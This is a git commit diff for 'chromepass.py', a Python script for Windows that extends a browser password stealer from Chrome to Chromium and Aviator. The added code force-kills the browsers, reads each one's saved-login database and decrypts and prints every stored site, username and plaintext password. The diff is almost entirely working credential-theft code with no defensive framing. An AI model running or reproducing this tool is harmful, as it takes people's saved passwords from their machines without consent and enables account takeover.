f0aa5fe8a77eee89ad327c400926cffa07dd8290
d4rkcat <d4rkcat@yandex.com>
2014-11-11 23:18:15 +0000

    Added Chromium and Aviator - OE-800

--- chromepass.py
+++ chromepass.py
@@ -1,20 +1,46 @@
-from os import getenv, sep
+#!/usr/bin/env python
+from os import getenv, sep, popen
 import sqlite3
 import win32crypt
 
+try:
+	popen('taskkill /f /im chrome.exe')
+except:
+	pass
+
+try:
+	popen('taskkill /f /im chromium.exe')
+except:
+	pass
+
+try:
+	popen('taskkill /f /im aviator.exe')
+except:
+	pass
+
 sendpass = ''
 appdata = getenv("APPDATA")
-connection = sqlite3.connect(appdata + "%s..%sLocal%sGoogle%sChrome%sUser Data%sDefault%sLogin Data" % (sep,sep,sep,sep,sep,sep,sep))
-cursor = connection.cursor()
-cursor.execute('SELECT origin_url, action_url, username_value, password_value FROM logins')
-for information in cursor.fetchall():
-	passw = win32crypt.CryptUnprotectData(information[3], None, None, None, 0)[1]
-	if passw:
-		sendpass += ' [*] Website-origin: ' + information[0]
-		sendpass += '\n [*] Website-action: ' + information[1]
-		sendpass += '\n [*] Username: ' + information[2]
-		sendpass += '\n [*] Password: ' + passw + '\n'
-if sendpass:
-	print sendpass
-else:
-	print ' [X] No passwords found'
+paths = []
+paths.append(appdata + "%s..%sLocal%sGoogle%sChrome%sUser Data%sDefault%sLogin Data" % (sep,sep,sep,sep,sep,sep,sep))  # Chrome
+paths.append(appdata + "%s..%sLocal%sChromium%sUser Data%sDefault%sLogin Data" % (sep,sep,sep,sep,sep,sep))            # Chromium
+paths.append(appdata + "%s..%sLocal%sAviator%sUser Data%sDefault%sLogin Data" % (sep,sep,sep,sep,sep,sep))             # Aviator
+
+for passpath in paths:
+	try:
+		connection = sqlite3.connect(passpath)
+		cursor = connection.cursor()
+		cursor.execute('SELECT origin_url, action_url, username_value, password_value FROM logins')
+		for information in cursor.fetchall():
+			passw = win32crypt.CryptUnprotectData(information[3], None, None, None, 0)[1]
+			if passw:
+				sendpass += ' [*] Website-origin: ' + information[0]
+				sendpass += '\n [*] Website-action: ' + information[1]
+				sendpass += '\n [*] Username: ' + information[2]
+				sendpass += '\n [*] Password: ' + passw + '\n'
+		if sendpass:
+			print '\n [*] Passwords found for %s:\n' % (passpath)
+			print sendpass
+		else:
+			print ' [X] No passwords found in %s' % (passpath)
+	except:
+		print ' [X] No database found at %s' % (passpath)
